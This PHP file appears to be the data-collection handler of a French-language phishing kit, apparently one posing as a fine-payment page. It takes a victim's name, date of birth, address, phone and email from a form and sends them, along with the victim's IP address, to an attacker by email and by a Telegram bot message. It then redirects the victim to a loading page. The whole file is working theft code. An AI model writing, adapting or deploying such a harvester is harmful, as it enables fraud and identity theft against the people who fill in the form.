<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$name = $_POST['prenom'] . " " . $_POST['nom'];
$ddn = $_POST['ddn'];
$phone = $_POST['tel'];
$email = $_POST['email'];
$rue = $_POST['rue'];
$ville = $_POST['ville'];
$postal = $_POST['postal'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['name'] = htmlspecialchars($name);
    $_SESSION['ddn'] = htmlspecialchars($ddn);
    $_SESSION['phone'] = htmlspecialchars($phone);
    $_SESSION['email'] = htmlspecialchars($email);
	$_SESSION['rue'] = htmlspecialchars($rue);
$_SESSION['ville'] = htmlspecialchars($ville);
$_SESSION['postal'] = htmlspecialchars($postal);

$message = '
[♾️] +1 INFOS du four [♾️]

👮 Nom : '.$_SESSION['name'].'
🎂 Date de naissance : '.$_SESSION['ddn'].'

👮 Rue : '.$_SESSION['rue'].'
👮 Ville : '.$_SESSION['ville'].'
👮 Code Postal : '.$_SESSION['postal'].'

📱 Téléphone : '.$_SESSION['phone'].'
💌 Email : '.$_SESSION['email'].'


🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'];

    if($mail_send == true){
      $Subject=" 「🍛」+1 INFOS ".$_SESSION['name']." | ".$_SERVER['REMOTE_ADDR'];
      $head="From: amendegod@rez.info <info@INUN.bg>";
      
      mail($rezmail,$Subject,$message,$head);
      }
      
      if($tlg_send == true){
          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=".$rez_chat."&text=".urlencode("$message"));
      }

    header('Location: ../loading.php');

}
?>